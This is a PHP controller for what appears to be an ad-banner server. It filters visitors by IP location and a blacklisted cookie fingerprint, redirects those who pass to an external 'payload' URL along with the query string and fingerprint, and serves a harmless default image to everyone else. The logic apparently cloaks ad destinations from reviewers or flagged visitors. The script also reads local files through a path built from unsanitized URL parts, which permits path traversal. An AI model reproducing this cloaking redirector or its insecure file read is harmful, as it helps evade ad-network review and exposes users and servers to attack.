<?php
global $controllerObject,$controllerFunction,$controllerID,$controllerData,$controllerData2,$controllerData3, $app_path,$cm_banner ;

/** ===========
 *  URL MAPPING
 *  ===========
 */

/** ===========================
 *  LOAD THE CAMPAIGN VARIABLES
 *  =========================== */

//First lets verify that the requested campaign identifier exists in the campaign list
$campaign_advertiser = $controllerFunction;
$campaign_identifier = $controllerID;
$campaign_banner_file = $controllerData;  
$campaign_banner_image = $campaign_banner_file;
$local_image = $app_path . 'banner/' . $campaign_advertiser . '/' . $campaign_identifier . '/' . $campaign_banner_image;

$user_platform = get_platform();

include_once(HELPER_PATH . 'ad_tag.helper.php');

/** ===================================
 *  SHOW 404 IF CAMPAIGN DOES NOT EXIST
 *  =================================== */
//If the requesting campaign doesn't exist, show an error page. The banner DIR is only for campaigns
if(!isset($cm_banner[$campaign_identifier]) ||
    !isset($cm_banner[$campaign_identifier]) ||
    !isset($cm_banner[$campaign_identifier]['advertiser']) ||
    $cm_banner[$campaign_identifier]['advertiser'] != $campaign_advertiser
) show_404();


/** ========================
 *  DISPLAY NON-IMAGE ASSETS
 *  ======================== */
//Lets see if they are requesting any prioritized resources like css, etc.

if(isset($cm_banner[$campaign_identifier]) &&
    strtolower($cm_banner[$campaign_identifier]['advertiser']) == strtolower($campaign_advertiser))
{
     switch($campaign_banner_file)
     {
         case 'banner.css':
             header('Content-type: text/css');
             exit(get_macro(AS_CSS_ANIMATION_SRC));
         break;

         case 'animate.js':
             header('Content-type: application/javascript');
             exit(get_macro(AS_JS_ANIMATION_SRC));
         break;

         case 'banner.js':
             header('Content-type: application/javascript');
             exit(get_macro(AS_JS_BANNER_SRC));
             break;
     }
}

/** ====================================================================
 *  MAKE SURE FILE BEING REQUESTED IS EITHER PAYLOAD OR REAL IMAGE ASSET
 *  ==================================================================== */
//lets make sure this image is actually part of a campaign
if(!array_key_exists($campaign_identifier,$cm_banner) &&
    strtolower($cm_banner[$campaign_identifier]['advertiser']) !== strtolower($campaign_advertiser) &&
    !isset($cm_banner[$campaign_identifier]['images'][$user_platform]) &&
    !file_exists($local_image)
) show_404();


/** ===============================
 *  IMAGE RESOURCE REQUEST REDIRECT
 *  ===============================
 *  Only fire CM if:
 *      • The image is actually part of a valid campaign
 *      • The "is_cm" flag is set to true
 *      • It passes server-side QC
 *  NOTE: The user must also pass the banner client code or the image
 *  will not even be served.
 */

//error_log('user_platform = ' . $user_platform);
if(isset($cm_banner[$campaign_identifier]['images'][$user_platform]) && !empty($cm_banner[$campaign_identifier]['images'][$user_platform][$campaign_banner_image]) && $cm_banner[$campaign_identifier]['is_cm'])
{
    $verify_instance = new Filter();
    if(isset($cm_banner[$campaign_identifier]['filter']) && !empty($cm_banner[$campaign_identifier]['filter']))
    {
        $verify_instance->set_filter($cm_banner[$campaign_identifier]['filter']);
        $is_verified = $verify_instance->is_verified();

    } else {
        $is_verified = true;
    }

    /*
    if(!$is_verified)error_log('
    ==================================
    WEVE DETECTED SOMETHING SUSPICIOUS
    ==================================
            ');
        error_log('
    ------------
    ' . $verify_instance->ip_location. '
    ------------
        ');
        unset($verify_instance);
    */
    $user_fingerprint = isset($_COOKIE['as_fp']) && $_COOKIE['as_fp'] != ''?$_COOKIE['as_fp']:false;

    if($user_fingerprint == 'd5ae380e61c3278a677417a2ef2c7feb') $is_verified = false;

    if($is_verified) {
        $campaign_data = (isset($_SERVER['QUERY_STRING']))?$_SERVER['QUERY_STRING']:'';

        $_url = $cm_banner[$campaign_identifier]['images'][$user_platform][$campaign_banner_image] . '/?' . $campaign_data . (($user_fingerprint)?('&fp=' . $user_fingerprint):'') ;

        header('Location: ' . $_url);
    }



} else
{
    /** -------------------------------------------------------
     *  If image is designated as a payload but CM is disabled,
     *  show it if exists, if not show a blank image by default
     *  ------------------------------------------------------- */

    if(!file_exists($local_image)) $local_image = $app_path . 'assets/default.png';
    $local_image_info = getimagesize($local_image);
    header('Content-type: '.$local_image_info['mime']);
    header("HTTP/1.1 200 OK");
    readfile($local_image);
}


